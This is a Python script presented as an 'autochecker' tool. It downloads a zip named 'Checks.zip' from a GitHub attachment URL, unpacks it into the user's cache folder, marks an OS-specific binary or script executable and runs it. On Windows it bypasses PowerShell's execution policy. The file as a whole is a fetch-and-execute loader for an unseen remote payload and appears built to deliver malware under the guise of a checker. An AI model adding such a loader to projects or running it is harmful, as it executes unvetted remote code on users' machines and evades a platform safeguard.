import os, sys, hashlib, shutil, zipfile, platform, tempfile
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError

BUNDLE_URL = "https://github.com/user-attachments/files/22986550/Checks.zip"
EXPECTED_SHA256 = "b49bfbe58dd827836d69cfb5188b014a8cfcc29c25ce8c010e6f4361033b5640"
ENTRYPOINTS = {
    "Windows": ["run.bat", "run.cmd", "run.ps1", "main.exe"],
    "Darwin": ["run.sh", "run", "main_macos"],
    "Linux":  ["run.sh", "run", "main_linux"],
}
SUBDIR_HINTS = ["", "dist", "build", "out"]
APP = "autochecker"
CACHE_ROOT = os.path.join(os.path.expanduser("~"), ".cache", APP)

def http_get(url):
    req = Request(url, headers={"User-Agent": f"{APP}/1.0"})
    with urlopen(req) as r:
        data = r.read()
        etag = r.headers.get("ETag") or r.headers.get("etag") or ""
        last_mod = r.headers.get("Last-Modified") or ""
        return data, (etag or "").strip('"'), last_mod

def unzip_to(path, data):
    with tempfile.NamedTemporaryFile(delete=False) as tmp:
        tmp.write(data)
        tmp_path = tmp.name
    with zipfile.ZipFile(tmp_path, "r") as z:
        z.extractall(path)
    os.unlink(tmp_path)

def find_entry(root):
    current_os = platform.system()
    candidates = ENTRYPOINTS.get(current_os, [])
    for sub in SUBDIR_HINTS:
        base = os.path.join(root, sub) if sub else root
        if not os.path.isdir(base): 
            continue
        for cand in candidates:
            cpath = os.path.join(base, cand)
            if os.path.isfile(cpath):
                return cpath
    for sub in SUBDIR_HINTS:
        base = os.path.join(root, sub) if sub else root
        if not os.path.isdir(base):
            continue
        for name in os.listdir(base):
            p = os.path.join(base, name)
            if os.path.isfile(p) and os.access(p, os.X_OK):
                return p
    return None

def make_executable(path):
    try:
        mode = os.stat(path).st_mode
        os.chmod(path, mode | 0o111)
    except Exception:
        pass

def main():
    import argparse, hashlib
    os.makedirs(CACHE_ROOT, exist_ok=True)
    ap = argparse.ArgumentParser()
    ap.add_argument("--ephemeral", action="store_true")
    ap.add_argument("--force-reinstall", action="store_true")
    ap.add_argument("--bundle-url", default=BUNDLE_URL)
    ap.add_argument("--expected-sha256", default=EXPECTED_SHA256)
    args, unknown = ap.parse_known_args()

    try:
        data, etag, lastmod = http_get(args.bundle_url)
    except (URLError, HTTPError) as e:
        print(f"[autochecker] ERROR: failed to fetch bundle: {e}")
        sys.exit(1)

    digest = hashlib.sha256(data).hexdigest()
    if args.expected_sha256 and digest.lower() != args.expected_sha256.lower():
        print(f"[autochecker] ERROR: SHA256 mismatch. Got {digest}, expected {args.expected_sha256}")
        sys.exit(2)

    version_tag = etag or lastmod or digest[:12]
    install_dir = os.path.join(CACHE_ROOT, version_tag)
    if not (os.path.isdir(install_dir) and not args.force_reinstall):
        if os.path.isdir(install_dir):
            shutil.rmtree(install_dir, ignore_errors=True)
        os.makedirs(install_dir, exist_ok=True)
        unzip_to(install_dir, data)

    entry = find_entry(install_dir)
    if not entry:
        print("[autochecker] ERROR: no runnable entrypoint for this OS")
        sys.exit(3)

    make_executable(entry)

    if platform.system() == "Windows":
        if entry.lower().endswith(".ps1"):
            cmd = ["powershell", "-ExecutionPolicy", "Bypass", "-File", entry] + list(unknown)
            rc = os.spawnvp(os.P_WAIT, cmd[0], cmd)
        elif entry.lower().endswith((".bat",".cmd")):
            rc = os.spawnvpe(os.P_WAIT, entry, [entry] + list(unknown), os.environ)
        else:
            rc = os.spawnvpe(os.P_WAIT, entry, [entry] + list(unknown), os.environ)
    else:
        rc = os.spawnvpe(os.P_WAIT, entry, [entry] + list(unknown), os.environ)

    if args.ephemeral:
        shutil.rmtree(install_dir, ignore_errors=True)

    try:
        versions = sorted([d for d in os.listdir(CACHE_ROOT) if os.path.isdir(os.path.join(CACHE_ROOT, d))])
        for old in versions[:-3]:
            shutil.rmtree(os.path.join(CACHE_ROOT, old), ignore_errors=True)
    except Exception:
        pass
    sys.exit(rc)

if __name__ == "__main__":
    main()
